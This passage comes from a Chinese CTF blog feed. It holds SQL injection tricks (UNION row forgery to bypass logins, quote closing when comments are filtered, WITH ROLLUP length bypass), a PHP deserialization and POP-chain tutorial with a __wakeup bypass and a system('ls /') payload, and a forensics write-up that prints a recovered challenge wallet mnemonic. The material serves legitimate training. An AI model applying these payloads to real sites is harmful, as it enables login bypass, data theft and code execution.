class="number">10</span>、mid(str,<span class="keyword">start</span>,[length])str:截取的字符串   <span class="keyword">start</span>:起始位置   length:截取的长度，可以忽略还可以这么构造:mid((str)<span class="keyword">from</span>(i)<span class="keyword">for</span>(<span class="number">1</span>)) #<span class="keyword">from</span>(<span class="number">1</span>)表示从第一个位置开始截取剩下的字符串，<span class="keyword">for</span>(<span class="number">1</span>)表示从改位置起一次就截取一个字符<span class="number">11.</span>reverse(concat(<span class="number">0x3a</span>，(<span class="keyword">select</span>(group_concat(real_flag_1s_here))<span class="keyword">from</span>(users)<span class="keyword">where</span>(real_flag_1s_here)regexp(<span class="string">&#x27;^f&#x27;</span>))))用reverse倒序输出，有时候有奇效。?大概吧</code></pre><h2 id="Episode-6-模糊匹配"><a href="#Episode-6-模糊匹配" class="headerlink" title="Episode 6  模糊匹配"></a>Episode 6  模糊匹配</h2><p>SQL模糊查询，使用like比较关键字，加上SQL里的通配符，请参考以下：</p><p>1、LIKE’Mc%’ 将搜索以字母 Mc 开头的所有字符串（如 McBadden）。</p><p>2、LIKE’%inger’ 将搜索以字母 inger 结尾的所有字符串（如 Ringer、Stringer）</p><p>3、LIKE’%en%’ 将搜索在任何位置包含字母 en 的所有字符串（如 Bennet、Green、McBadden）。</p><p>4、LIKE’_heryl’ 将搜索以字母 heryl 结尾的所有六个字母的名称（如 Cheryl、Sheryl）。</p><p>5、LIKE’[CK]ars[eo]n’ 将搜索下列字符串：Carsen、Karsen、Carson 和 Karson（如 Carson）。</p><p>6、LIKE’[M-Z]inger’ 将搜索以字符串 inger 结尾、以从 M 到 Z 的任何单个字母开头的所有名称（如 Ringer）。</p><p>7、LIKE’M[^c]%’ 将搜索以字母 M 开头，并且第二个字母不是 c 的所有名称（如MacFeather）。</p><h2 id="Episode-7-奇奇怪怪的知识点和一些技巧积累"><a href="#Episode-7-奇奇怪怪的知识点和一些技巧积累" class="headerlink" title="Episode   7 奇奇怪怪的知识点和一些技巧积累"></a>Episode   7 奇奇怪怪的知识点和一些技巧积累</h2><h3 id="短路算法："><a href="#短路算法：" class="headerlink" title="短路算法："></a><strong>短路算法：</strong></h3><p>|| 逻辑或的短路：a||b</p><p>计算机发现a是真，那么输出a；如果a是假，那么输出b</p><p>select 1 from ：建立一个临时列，这个列的所有初始值都被设为1。如果发现select后面跟有||就可以构造1 ||(sql语句) 用来无效化后方语句。</p><h3 id="WITH-ROLLUP-来自ctfshow-web10"><a href="#WITH-ROLLUP-来自ctfshow-web10" class="headerlink" title="WITH ROLLUP:(来自ctfshow web10)"></a><strong>WITH ROLLUP:</strong>(来自ctfshow web10)</h3><pre><code class="highlight plaintext">语法:group by xxx with rollup</code></pre><p>with rollup是对前面数据的一次汇总，此时在查询的数据中会被插入一行值为NULL,此时即可绕过长度检验，前提你要知道在哪个表并且没有对第二个字段是否输入的前端检查</p><h3 id="联合查询伪造"><a href="#联合查询伪造" class="headerlink" title="联合查询伪造"></a><strong>联合查询伪造</strong></h3><p>通过联合查询，你可以伪造一段没有的数据(即临时数据)</p><p>因为union select会把查询结果接在前一个查询结果后面，前面如果查到了东西，那么取得还是第一行</p><p>那么通过让前面查不到，回显我们的注入语句就能够达到注入目的(呃呃，感觉有点像二次注入的后面半段)</p><p>这里直接应用别的师傅打好的案例</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250330124245041.png" alt="image-20250330124245041"></p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250330124258559.png" alt="image-20250330124258559"></p><p>那么只要知道username所在的列就可以直接糊弄过密码的检测了</p><h3 id="注释和非注释闭合"><a href="#注释和非注释闭合" class="headerlink" title="注释和非注释闭合"></a>注释和非注释闭合</h3><p>众所周知，<code># --+</code>是为了注释掉后面的’</p><p>那我问你，如果注释符全被过滤了呢</p><p>诶，那就用到非注释闭合，就是在payload最后把–+这些换成and ‘1’&#x3D;’1</p><p>来达到正常注入不报错的目的</p><h2 id="Episode-8-一点感想"><a href="#Episode-8-一点感想" class="headerlink" title="Episode   8 一点感想"></a>Episode   8 一点感想</h2><p>刷了一些题目，发现最重要的其实是注入点的判断(除非是万恶的盲注，那重点可能更在脚本上)</p><p>[参考文章]: <a href="https://www.cnblogs.com/ECJTUACM-873284962/p/8977983.html">https://www.cnblogs.com/ECJTUACM-873284962/p/8977983.html</a>“基于约束的SQL攻击 - Angel_Kitty - 博客园”<br>[参考文章]: <a href="https://www.cnblogs.com/icui4cu/p/15136893.html">https://www.cnblogs.com/icui4cu/p/15136893.html</a>“宽字节注入原理及绕过方式”</p>]]></content>
      
      
      
        <tags>
            
            <tag> -web -CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化</title>
      <link href="/2025/03/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2025/03/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP反序列化学习"><a href="#PHP反序列化学习" class="headerlink" title="PHP反序列化学习"></a>PHP反序列化学习</h1><h2 id="入门之前"><a href="#入门之前" class="headerlink" title="入门之前"></a>入门之前</h2><p>首先要知道PHP是一门面向对象的语言</p><p>所以会碰到类，对象之类的概念</p><p>稍微补充一点罢，不然会听不懂的()</p><ul><li><strong>类</strong> − 定义了一件事物的抽象特点。类的定义包含了数据的形式以及对数据的操作。</li><li><strong>对象</strong> − 是类的实例。</li><li><strong>成员变量</strong> − 定义在类内部的变量。该变量的值对外是不可见的，但是可以通过成员函数访问，在类被实例化为对象后，该变量即可成为对象的<strong>属性</strong>。</li><li><strong>成员函数</strong> − 定义在类的内部，可用于访问对象的数据。</li><li><strong>继承</strong> − 继承性是子类自动共享父类数据结构和方法的机制，这是类之间的一种关系。在定义和实现一个类的时候，可以在一个已经存在的类的基础之上来进行，把这个已经存在的类所定义的内容作为自己的内容，并加入若干新的内容。</li><li><strong>父类</strong> − 一个类被其他类继承，可将该类称为父类，或基类，或超类。</li><li><strong>子类</strong> − 一个类继承其他类称为子类，也可称为派生类。</li><li><strong>多态</strong> − 多态性是指相同的函数或方法可作用于多种类型的对象上并获得不同的结果。不同的对象，收到同一消息可以产生不同的结果，这种现象称为多态性。</li><li><strong>重载</strong> − 简单说，就是函数或者方法有同样的名称，但是参数列表不相同的情形，这样的同名不同参数的函数或者方法之间，互相称之为重载函数或者方法。</li><li><strong>抽象性</strong> − 抽象性是指将具有一致的数据结构（属性）和行为（操作）的对象抽象成类。一个类就是这样一种抽象，它反映了与应用有关的重要性质，而忽略其他一些无关内容。任何类的划分都是主观的，但必须与具体的应用有关。</li><li><strong>封装</strong> − 封装是指将现实世界中存在的某个客体的属性与行为绑定在一起，并放置在一个逻辑单元内。</li><li><strong>构造函数</strong> − 主要用来在创建对象时初始化对象， 即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。</li><li><strong>析构函数</strong> − 析构函数(destructor) 与构造函数相反，当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数。析构函数往往用来做”清理善后” 的工作（例如在建立对象时用new开辟了一片内存空间，应在退出前在析构函数中用delete释放）。</li></ul><pre><code class="highlight php"><span class="meta">&lt;?php</span><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;<span class="comment">//类</span>  <span class="comment">/* 成员变量 */</span>  <span class="keyword">var</span> <span class="variable">$url</span>;  <span class="keyword">var</span> <span class="variable">$title</span>;    <span class="comment">/* 成员函数 */</span>  <span class="function"><span class="keyword">function</span> <span class="title">setUrl</span>(<span class="params"><span class="variable">$par</span></span>)</span>&#123;     <span class="variable language_">$this</span>-&gt;url = <span class="variable">$par</span>;  &#125;    <span class="function"><span class="keyword">function</span> <span class="title">getUrl</span>(<span class="params"></span>)</span>&#123;     <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;url . PHP_EOL;  &#125;    <span class="function"><span class="keyword">function</span> <span class="title">setTitle</span>(<span class="params"><span class="variable">$par</span></span>)</span>&#123;     <span class="variable language_">$this</span>-&gt;title = <span class="variable">$par</span>;  &#125;    <span class="function"><span class="keyword">function</span> <span class="title">getTitle</span>(<span class="params"></span>)</span>&#123;     <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;title . PHP_EOL;  &#125;&#125;<span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Site</span>();<span class="comment">//创建对象</span><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">setTitle</span>(<span class="string">&#x27;AyaN0&#x27;</span>);<span class="comment">//调用成员方法</span><span class="comment">//或者$a-&gt;setTitle=&#x27;AyaN0&#x27;;</span><span class="meta">?&gt;</span></code></pre><h2 id="pop链构造"><a href="#pop链构造" class="headerlink" title="pop链构造"></a>pop链构造</h2><h3 id="construct-和-destruct"><a href="#construct-和-destruct" class="headerlink" title="__construct() 和 __destruct()"></a><code>__construct()</code> 和 <code>__destruct()</code></h3><p><code>__construct</code>：当对象<strong>创建</strong>时会自动调用，注意是创建的时候，也就是说有<code>new</code>的时候就会调用，在<code>unserialize</code>时是不会被自动调用的</p><pre><code class="highlight plaintext">__destruct()`：当对象被销毁时会自动调用；当新对象创建后，它后面一定会被自动销毁，也就是调用`__construct`后一定会调用`__destruct`；或者我们直接传入一个对象，它后面被销毁时也会调用`__destruct</code></pre><p>可以看到，创建对象e时调用了<code>__construct</code>，然后输出序列化后的对象<code>t</code>，最后在销毁对象<code>t</code>时调用了<code>__destruct</code></p><ul><li><p>实例</p><pre><code class="highlight php"><span class="meta">&lt;?php</span><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;    <span class="keyword">public</span> <span class="variable">$username</span>;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span></span>)</span><span class="function">    </span>&#123;        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;        <span class="keyword">echo</span> <span class="string">&quot;__construct test&quot;</span>;    &#125;&#125;<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;F0rmat&quot;</span>);<span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);<span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);<span class="meta">?&gt;</span><span class="comment">//__construct test</span></code></pre><pre><code class="highlight php"><span class="meta">&lt;?php</span><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span><span class="function">    </span>&#123;        <span class="keyword">echo</span> <span class="string">&quot;__destruct test&lt;/br&gt;&quot;</span>;    &#125;&#125;<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();<span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);<span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);<span class="meta">?&gt;</span><span class="comment">//__destruct test</span><span class="comment">//__destruct test</span></code></pre></li></ul><h3 id="sleep-和-wakeup"><a href="#sleep-和-wakeup" class="headerlink" title="__sleep() 和 __wakeup()"></a><code>__sleep()</code> 和 <code>__wakeup()</code></h3><p><code>__sleep()</code> ：在对象被序列化<strong>之前</strong>被调用，就是说看到<code>serialize</code>时就会被调用，而且是先调用后再执行序列化</p><p><code>__wakeup()</code>: 将在<strong>字符串被反序列化之后被立即调用</strong>，就是说<strong>看到</strong><code>unserialize</code><strong>后就会被立即调用</strong></p><p>在看到<code>serialize($b)</code>后，它是先调用了<code>__sleep()</code>魔法函数，然后才执行了<code>echo</code>，输出了字符串</p><p>直接输入了<strong>字符串</strong>，当它执行了<code>unserialize</code>转换成对象后，就会最先调用<code>__wakeup()</code>，它的优先级最高</p><pre><code class="highlight php"><span class="meta">&lt;?php</span><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;    <span class="keyword">public</span> <span class="variable">$username</span>;    <span class="keyword">public</span> <span class="variable">$nickname</span>;    <span class="keyword">private</span> <span class="variable">$password</span>;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)</span><span class="function">    </span>&#123;        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;    &#125;    <span class="comment">// 重载序列化调用的方法</span>    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span><span class="function">    </span>&#123;        <span class="comment">// 返回需要序列化的变量名，过滤掉password变量</span>        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;nickname&#x27;</span>);    &#125;&#125;<span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>);<span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);<span class="comment">//O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;结果就是过滤掉了password的值</span></code></pre><pre><code class="highlight php"><span class="meta">&lt;?php</span><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;    <span class="keyword">public</span> <span class="variable">$username</span>;    <span class="keyword">public</span> <span class="variable">$nickname</span>;    <span class="keyword">private</span> <span class="variable">$password</span>;    <span class="keyword">private</span> <span class="variable">$order</span>;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)</span><span class="function">    </span>&#123;        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;    &#125;    <span class="comment">// 定义反序列化后调用的方法</span>    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span><span class="function">    </span>&#123;        <span class="variable language_">$this</span>-&gt;password = <span class="variable language_">$this</span>-&gt;username;    &#125;&#125;<span class="variable">$user_ser</span> = <span class="string">&#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;&#x27;</span>;<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$user_ser</span>));<span class="comment">/*</span><span class="comment">class User#1 (4) &#123;</span><span class="comment">  public $username =&gt;</span><span class="comment">  string(1) &quot;a&quot;</span><span class="comment">  public $nickname =&gt;</span><span class="comment">  string(1) &quot;b&quot;</span><span class="comment">  private $password =&gt;</span><span class="comment">  string(1) &quot;a&quot;</span><span class="comment">  private $order =&gt;</span><span class="comment">  NULL</span><span class="comment">&#125;</span><span class="comment">上面wakeup的函数作用是将username的变量值赋值给password变量。*/</span></code></pre><h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a><code>__toString()</code></h3><p><code>__toString()</code>魔术方法是最为最要的，在构造pop链中它往往是很关键的一环，在很多种情况下都会被调用，主要是下面这些：</p><ol><li><code>echo($obj)</code>或<code>print($obj)</code><strong>打印对象</strong>时会触发</li><li><strong>反序列化对象</strong>与字符串连接时</li><li><strong>反序列化对象</strong>参与格式化字符串时</li><li><strong>反序列化对象</strong>与<strong>字符串</strong>进行<code>preg_match</code>正则匹配)，因为php进行弱比较时会转换参数类型，相当于都转换成字符串进行比较</li><li><strong>反序列化对象</strong>参与<strong>格式化sql语句</strong>时，绑定参数时(用的少)</li><li><strong>反序列化对象</strong>经过<strong>php字符串函数</strong>时，如<code>strlen()</code>，<code>addslashes()</code>时(用的少)</li><li>在<code>in_array()</code>方法中，第一个参数是<strong>反序列化对象</strong>，第二个参数的数组中有<code>tostring</code>返回的字符串的时候<code>tostring</code>会被调用</li><li><strong>反序列化对象</strong>作为<code>class_exists()</code>的参数的时候(用的少)</li></ol><p>通过看它被调用的情况，不难总结出，当对象被当成了字符串的时候，<code>__toString()</code>就会被调用，无论是将对象打印出来，还是将对象去与字符串进行比较，它都会被调用；这里要注意的是，必须要操作的是<strong>对象</strong>的时候，才会被调用</p><p>新建了对象<code>t</code>就直接打印它，照理说肯定是不会有任何回显的，因为只有字符串能被打印，对象肯定是不能被直接打印的，需要先将它序列化成字符串后才可以打印；但我们这直接打印发现它居然有输出，就是因为它按照操作字符串的方法去操作了对象，所以说调用了<code>__toString()</code>，然后将它的返回值输出了出来</p><pre><code class="highlight php"><span class="meta">&lt;?php</span><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span><span class="function">    </span>&#123;       <span class="keyword">return</span> <span class="string">&#x27;__toString test&#x27;</span>;    &#125;&#125;<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();<span class="keyword">echo</span> <span class="variable">$test</span>;<span class="comment">//__toString</span></code></pre><h3 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a><code>__invoke()</code></h3><p><code>__invoke</code>：当尝试以调用<strong>函数</strong>的方式调用一个<strong>对象</strong>时，<code>__invoke()</code>方法会被自动调用，而调用函数的方式就是在后面加上<code>()</code>，当我们看到像<code>return $function();</code>这种语句时，就应该意识到后面可能会调用<code>__invoke()</code>，下图是直接在对象后面加<code>()</code>调用</p><p>需要注意的是，这个魔术方法只在<strong>PHP 5.3.0 及以上版本</strong>有效</p><pre><code class="highlight php"><span class="meta">&lt;?php</span><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span><span class="function">    </span>&#123;       <span class="keyword">echo</span> <span class="string">&#x27;__invoke test&#x27;</span>;    &#125;&#125;<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();<span class="variable">$test</span>();<span class="comment">//__invoke test</span></code></pre><h3 id="get-和-set"><a href="#get-和-set" class="headerlink" title="__get() 和 __set()"></a><code>__get()</code> 和 <code>__set()</code></h3><p><code>__get()</code>：从<strong>不可访问的属性中</strong>读取值，或者说是<strong>调用一个类及其父类方法中未定义属性时</strong>，需要一个参数，代表不存在的属性值</p><p><code>__set()</code>：当给一个未定义的属性赋值时，或者修改一个不能被修改的属性时(<code>private</code> <code>protected</code>)(用的不多)</p><p><code>echo</code>语句调用了<code>__toString()</code>，然后它返回的是当前对象的<code>t</code>属性，但我们是没有定义<code>t</code>这个属性的，所以说会调用<code>__get()</code>，然后将返回值打印出来</p><pre><code class="highlight php"><span class="meta">&lt;?php</span><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;    <span class="keyword">public</span> <span class="variable">$var1</span>;    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span><span class="function">    </span>&#123;        <span class="keyword">echo</span> <span class="variable">$arg1</span>;    &#125;&#125;<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();<span class="variable">$test</span>-&gt;var2;<span class="meta">?&gt;</span>    <span class="comment">//var2</span></code></pre><pre><code class="highlight php"><span class="meta">&lt;?php</span><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;    <span class="keyword">public</span> <span class="variable">$var1</span>;    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span><span class="function">    </span>&#123;        <span class="keyword">echo</span> <span class="variable">$arg1</span>.<span class="string">&#x27;,&#x27;</span>.<span class="variable">$arg2</span>;    &#125;&#125;<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();<span class="variable">$test</span>-&gt;var2=<span class="number">1</span>;<span class="meta">?&gt;</span></code></pre><h3 id="call-和-callStatic"><a href="#call-和-callStatic" class="headerlink" title="__call() 和 __callStatic()"></a><code>__call()</code> 和 <code>__callStatic()</code></h3><p><code>__call</code>：在对象中调用类中不存在的方法时，或者是不可访问方法时被调用</p><p><code>__callStatic</code>：在静态上下文中调用一个不可访问静态方法时被调用(用的不多)</p><p>比如说像这段代码，我们调用对象<code>t</code>中的方法<code>t2</code>，但因为类中没有方法<code>t2</code>，所以说就调用了<code>__call()</code></p><pre><code class="highlight php"><span class="meta">&lt;?php</span><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span><span class="function">    </span>&#123;        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;    &#125;&#125;<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();<span class="variable">$test</span>-&gt;<span class="title function_ invoke__">callxxx</span>(<span class="string">&#x27;a&#x27;</span>);<span class="meta">?&gt;</span><span class="comment">//callxxx,a</span></code></pre><pre><code class="highlight php"><span class="meta">&lt;?php</span><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span><span class="function">    </span>&#123;        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;    &#125;&#125;<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();<span class="variable">$test</span>::<span class="title function_ invoke__">callxxx</span>(<span class="string">&#x27;a&#x27;</span>);<span class="meta">?&gt;</span><span class="comment">//callxxx,a</span></code></pre><p>这里先来学习一下双冒号的用法，双冒号也叫做范围解析操作符（也可称作 Paamayim Nekudotayim）或者更简单地说是一对冒号，可以用于访问静态成员，类常量，还可以用于覆盖类中的属性和方法。自 PHP 5.3.0 起，可以通过变量来引用类，该变量的值不能是关键字（如 self，parent 和 static）。与**__call<strong>不同的是需要添加</strong>static**，只有访问不存在的静态方法才会触发。</p><h3 id="clone"><a href="#clone" class="headerlink" title="__clone()"></a><code>__clone()</code></h3><p><code>__clone()</code>:当使用clone关键字拷贝完成一个对象后，新对象就会调用定义的魔术方法(如果存在)</p><pre><code class="highlight php"><span class="meta">&lt;?php</span><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span><span class="function">    </span>&#123;        <span class="keyword">echo</span> <span class="string">&quot;__clone test&quot;</span>;    &#125;&#125;<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();<span class="variable">$newclass</span> = <span class="keyword">clone</span>(<span class="variable">$test</span>);<span class="meta">?&gt;</span><span class="comment">//__clone test</span></code></pre><h3 id="isset-和-unset"><a href="#isset-和-unset" class="headerlink" title="__isset()和__unset"></a><code>__isset()</code>和<code>__unset</code></h3><p><code>__isset()</code>:对不可访问属性调用<code>isset()</code>或者<code>empty()</code>时，<code>__isset()</code>会被调用</p><p><code>__unset()</code>:对不可访问属性调用<code>unset()</code>时，<code>__unset()</code>会被触发</p><pre><code class="highlight php"><span class="meta">&lt;?php</span><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;    <span class="keyword">private</span> <span class="variable">$var</span>;    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$arg1</span></span>)</span><span class="function">    </span>&#123;        <span class="keyword">echo</span> <span class="variable">$arg1</span>;    &#125;&#125;<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();<span class="keyword">isset</span>(<span class="variable">$test</span>-&gt;var1);<span class="meta">?&gt;</span>    <span class="comment">//var1</span></code></pre><pre><code class="highlight php"><span class="meta">&lt;?php</span><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$arg1</span></span>)</span><span class="function">    </span>&#123;        <span class="keyword">echo</span> <span class="variable">$arg1</span>;    &#125;&#125;<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();<span class="keyword">unset</span>(<span class="variable">$test</span>-&gt;var1);<span class="meta">?&gt;</span>    <span class="comment">//var1</span></code></pre><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="绕过-wakeup"><a href="#绕过-wakeup" class="headerlink" title="绕过 __wakeup:"></a>绕过 __wakeup:</h3><ul><li>PHP5 &lt; 5.6.25</li><li>PHP7 &lt; 7.0.10</li></ul><p>当序列化后对象的参数列表中成员个数和实际个数不符合时会绕过 __wakeup()</p><p>&#x2F;&#x2F;详见[SWPUCTF 2021 新生赛]no_wakeup</p><p>当然，也可以通过赋值来绕过__wake下面将执行的字符串置空的情况</p><p>使另一个构造好的变量和被控制的变量公用一个内存如</p><pre><code class="highlight plaintext">$t-&gt;c=&quot;system(&#x27;ls /&#x27;);&quot;;$t-&gt;b=&amp;$t-&gt;a;//a未被wakeup置空的变量，执行的也是a,前面还有一个c-&gt;b的过程</code></pre><h3 id="绕过-O"><a href="#绕过-O" class="headerlink" title="绕过 O"></a>绕过 O</h3><p>有时会对构造的payload进行正则匹配</p><p>此时需要绕过一些必须绕过的关键词，如O</p><p>gc机制</p><h2 id="构链经验"><a href="#构链经验" class="headerlink" title="构链经验:"></a>构链经验:</h2><p>首先，找到注入点，注入点一般 被包裹在最内部(因为第一个执行，通过各种魔术方法将结果成功传输到外部并成功销毁对象)，接着内层的魔术方法要在紧邻的外层得到触发，(也就是为什么他被称为pop链的缘故)，最后成功销毁就算pop链构造成功了</p><h2 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h2>]]></content>
      
      
      
        <tags>
            
            <tag> -web -CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF2025</title>
      <link href="/2025/02/10/VNCTF2025/"/>
      <url>/2025/02/10/VNCTF2025/</url>
      
        <content type="html"><![CDATA[<h1 id="VNCTF-2025"><a href="#VNCTF-2025" class="headerlink" title="VNCTF 2025"></a>VNCTF 2025</h1><p>入坑CTF以来打过最难的个人赛，打完的表情就像先辈的一张表情包一样</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/e7584e8da9773912fec999bbbd198618347ae2dc.jpg" alt="img"></p><p>比赛期间就出了一题，这才是正统misc吗哈哈(</p><h2 id="VN-Lang"><a href="#VN-Lang" class="headerlink" title="VN_Lang"></a><strong>VN_Lang</strong></h2><p>不能较真的签到题，附件一个exe,一个莫名其妙的源代码。看起来花里胡哨，实际010一查就出来了</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210180505746.png" alt="image-20250210180505746"></p><h2 id="echo-flowers"><a href="#echo-flowers" class="headerlink" title="echo_flowers"></a>echo_flowers</h2><p>区块链的基本知识和取证搭配的好题。大概?</p><p>给了一个安卓的镜像，先VM开了，不得不吐槽的一点是，操作是真吃力啊。。。</p><p>先放个hint<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210180853422.png" alt="image-20250210180853422"></p><p>我没有那么多知识储备，所以其实能用的hint也不多，就一个软件本身没有缓存<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210180951701.png" alt="image-20250210180951701"></p><p>看到干干净净的桌面其实就能感觉到不对劲了哈哈，连文件管理都没有还整什么，果断放弃仿真取证。挂DiskGenius</p><p>既然说软件本身没有任何缓存。。那么从哪里入手呢，其实和bashhistory有点相似吧(刚好之前看到过类似的题目)</p><p>也就是，从输入法的缓存，或者说，输入的记录入手。</p><p>定位交给AI<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210181822981.png" alt="image-20250210181822981"></p><p>正好我们是可以找到files这一文件夹的<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210181930421.png" alt="image-20250210181930421"></p><p>接下来一个个看过去其实也可以，最终是可以定位到sgim_gd_usr.bin这个文件的,当然按理来说我们应该先排查.db，.dat，.log这类文件的<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210182036252.png" alt="image-20250210182036252"></p><p>最终找到助记词ranch only space define laundry carpet muscle ramp high twenty couch fashion</p><p>挂上Metamask,记得一定要用没用使用过metamask的浏览器，因为如果你有账户你要导入一般是会让你直接输入密钥登录的</p><p>接下来按照指示输入助记词，重置密码，点击你的账户-&gt;账户详情-&gt;查看密钥就结束了</p><h2 id="ezSignal"><a href="#ezSignal" class="headerlink" 